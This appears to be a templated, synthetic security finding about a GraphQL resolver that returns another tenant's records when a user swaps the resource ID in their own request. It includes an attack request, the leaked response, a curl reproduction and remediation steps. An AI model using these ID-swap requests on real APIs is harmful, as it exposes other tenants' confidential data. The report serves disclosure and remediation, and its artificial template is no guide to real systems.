# Security Analysis Report
**System:** Aegis Vault Secure Repository
**Domain:** Defense Industrial Base
**Example ID:** GQL-0306
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User — Pattern 10.1 | ID swap in own request on `getResource` — attacker substitutes their own valid `resourceId` with a victim's to access defense-grade classified records |

---

## Finding 1 — Single-User: ID Swap in Own Request (Pattern 10.1)

### Summary
The `getResource` resolver on Aegis Vault Secure Repository (`api.aegis-vault-secure-r.example.com`) fetches defense classified records by `resourceId` only, without verifying the fetched object's `tenantId` against the JWT's `tenantId` (RISK-GQL-306). Per §5.0 Pattern 10.1, a single authenticated user substitutes their own valid `resourceId` with a victim's `resourceId` within their own active request. With one token for `tenant-b706`, the attacker accesses classified records belonging to `tenant-67e6`.

**HAR/response key consistency:** HAR query uses `getResource`, and the response key is also `getResource` — consistent, no naming conflict.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no user/tenant dimension), enabling cross-tenant cache poisoning of defense-classified data.

**Pattern:** 10.1 — ID swap in own request (Single-User)
**Affected resolver:** `getResource`
**Affected endpoint:** `POST https://api.aegis-vault-secure-r.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.aegis-vault-secure-r.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-b706

{"query": "query VulnerableOp { getResource(id: \"R-2306\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Resource Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-67e6",
      "ownerId": "other-user-b70667e6",
      "data": {
        "sensitiveField": "CONFIDENTIAL-b70667e6",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-b706`. Returned data belongs to: `tenant-67e6`. Cross-tenant defense data exfiltration confirmed.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.aegis-vault-secure-r.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b706" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2306\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: data.getResource.tenantId == "tenant-67e6" (different from JWT tenant-b706)
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `getResource` resolver: after fetch, assert `fetched.tenantId === jwt.tenantId`. Return 403 on mismatch.
2. Additionally assert `fetched.ownerId === jwt.sub` for single-user ownership validation.
3. Re-key Redis cache to include both `tenantId` and `userId` (e.g., `tenant:{tenantId}:user:{sub}:resource:{resourceId}`).
4. Apply mandatory ABAC policies for all defense-classified data — `tenantId` AND user clearance level must match before returning any record.
